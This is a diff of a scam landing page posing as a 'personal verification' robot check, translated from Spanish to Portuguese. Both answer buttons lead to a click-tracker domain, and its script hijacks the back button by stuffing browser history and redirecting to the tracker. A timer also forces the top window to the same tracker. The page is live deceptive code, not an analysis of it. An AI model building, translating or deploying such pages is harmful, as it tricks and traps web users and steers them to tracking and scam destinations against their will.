@@ -4,7 +4,7 @@
 	<meta name="pushsdk" content="a5034e6c68d4cb6a8cb95680f3fe3649">
 	<meta charset="utf-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-	<title>prueba completa!</title>
+	<title>teste completo!</title>
 	<link rel="stylesheet" href="style.css">
 </head>
 <body>
@@ -12,18 +12,18 @@
 
 	<div class="main">
 		
-		<h1>verificación personal</h1>
+		<h1>verificação pessoal</h1>
 
 		<p><img src="robot.png" class="image"></p>
 
-		<p class="intro">responde algunas preguntas<br>En el siguiente<span class="timer red" id="timer"></span> Autenticado como persona.</p>
+		<p class="intro">responda algumas perguntas<br>na próxima vez<span class="timer red" id="timer"></span> Autenticado como pessoa.</p>
 
 		<div class="survey">
 			<div class="survey_question">
-				<h3>Estás de acuerdo</h3>
+				<h3>Você concorda</h3>
 				<div class="answers">
-					<a href="https://1c49p.bemobtrcks.com/click/1">Sí</a>
-					<a href="https://1c49p.bemobtrcks.com/click/2">No</a>
+					<a href="https://1c49p.bemobtrcks.com/click">Sim</a>
+					<a href="https://1c49p.bemobtrcks.com/click">Não</a>
 				</div>
 			</div>
 		</div>
@@ -60,7 +60,7 @@
 			const URL = window.location.href.split(/[#]/)[0];
 			for (t = 0; 10 > t; ++t) history.pushState({}, "", URL + '#')
 			onpopstate = function(event) {
-				event.state && location.replace('https://1c49p.bemobtrcks.com/click/3');
+				event.state && location.replace('https://1c49p.bemobtrcks.com/click');
 			}
 		} catch (o) {
 			console.log(o);
@@ -77,7 +77,7 @@
 		
 			setTimeout(function() {
 		
-				window.top.location.href = 'https://1c49p.bemobtrcks.com/click/4';
+				window.top.location.href = 'https://1c49p.bemobtrcks.com/click';
 		
 				setTimeout(function() {
 					redirecting = true;
